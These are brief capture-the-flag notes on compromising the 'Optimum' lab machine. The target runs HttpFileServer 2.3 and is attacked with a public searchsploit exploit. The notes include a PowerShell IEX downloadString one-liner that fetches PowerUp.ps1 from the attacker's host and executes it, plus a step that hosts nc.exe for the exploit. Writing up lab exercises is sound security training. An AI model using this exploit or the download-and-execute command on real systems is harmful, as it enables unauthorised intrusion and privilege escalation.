# Optimum
## Only port 80 is open
### HttpFileServer 2.3
- In the page source, can see that the service is rejectto
```
<a href="http://www.rejetto.com/hfs/">HttpFileServer 2.3</a>
```

### Searchsploit had an exploit for this specific version
- run the exploit by modifying the ip address and port it searches for
- Copy nc.exe into a directory we want to host via https
- run the exploit using ./rejetto-hfs-exploit.py 10.10.10.8 80
	- port 80 because that is the port that hfs is running on their server

## Downloading and running a string
```
IEX(NewObject Net.WebClient).downloadString('http://10.10.14.21:8000/PowerUp.ps1')
```
- invoke powershell command in the cmd prompt
```
powershell -c "IEX ..."
```
